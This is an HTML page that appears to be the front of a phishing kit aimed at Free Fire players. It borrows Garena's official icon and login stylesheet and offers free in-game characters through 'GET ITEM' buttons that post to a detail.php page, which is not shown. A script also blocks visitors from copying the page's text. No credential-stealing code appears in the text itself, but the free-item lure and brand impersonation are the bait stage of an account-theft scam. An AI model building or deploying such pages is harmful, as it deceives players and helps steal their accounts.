
<!DOCTYPE html>
<html>
<script type='text/javascript'>
//<![CDATA[
document.addEventListener('copy', function (e){
    e.preventDefault();
  e.clipboardData.setData("text/plain", "Jangan Copas Gan :) "+window.location.href+"");
})
//]]>
</script>
<head>
    <meta charset="UTF-8">
    <title>FREE FIRE</title>
    <link rel="stylesheet" href="ccss/style.css">
    <link rel="shortcut icon" href="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png"/>
	<link href="https://cdngarenanow-a.akamaihd.net/gop/sso/theme/dark/css/sso.css?v=0.47" rel="stylesheet" type="text/css"/>
</head>
<script type='text/javascript'>
//<![CDATA[
document.addEventListener('copy', function (e){
    e.preventDefault();
  e.clipboardData.setData("text/plain", "Jangan Copas Gan :) "+window.location.href+"");
})
//]]>
</script>
<body>
       <center><img src="img/back.jpg" width=cover height=cover></center><br>
    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="img/1benong.png">
                <span class="name"></span>
            </div>
            <form action="detail.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="GET ITEM" class="tombol"/>
            </form>
            <span class="tip">-GRATIS</span>
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="img/2benong.png">
                <span class="name"></span>
            </div>
            <form action="detail.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="GET ITEM" class="tombol"/>
            </form>
            <span class="tip">-GRATIS</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="img/3benong.png">
                <span class="name"></span>
            </div>
            <form action="detail.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="GET ITEM" class="tombol"/>
            </form>
            <span class="tip">-GRATIS</span>
        </div>
    </div>

    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="img/4benong.png">
                <span class="name"></span>
            </div>
            <form action="detail.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="GET ITEM" class="tombol"/>
            </form>
            <span class="tip">-GRATIS</span>
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="img/5benong.png">
                <span class="name"></span>
            </div>
            <form action="detail.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="GET ITEM" class="tombol"/>
            </form>
            <span class="tip">-GRATIS</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="img/6benong.png">
                <span class="name"></span>
            </div>
            <form action="detail.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="GET ITEM" class="tombol"/>
            </form>
            <span class="tip">-GRATIS</span>
        </div>
    </div>

    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="img/1.png">
                <span class="name"></span>
            </div>
            <form action="detail.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="GET ITEM" class="tombol"/>
            </form>
            <span class="tip">-GRATIS</span>
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="img/2.png">
                <span class="name"></span>
            </div>
            <form action="detail.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="GET ITEM" class="tombol"/>
            </form>
            <span class="tip">-GRATIS</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="img/3.png">
                <span class="name"></span>
            </div>
            <form action="detail.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="GET ITEM" class="tombol"/>
            </form>
            <span class="tip">-GRATIS</span>
        </div>
    </div>
    
</html>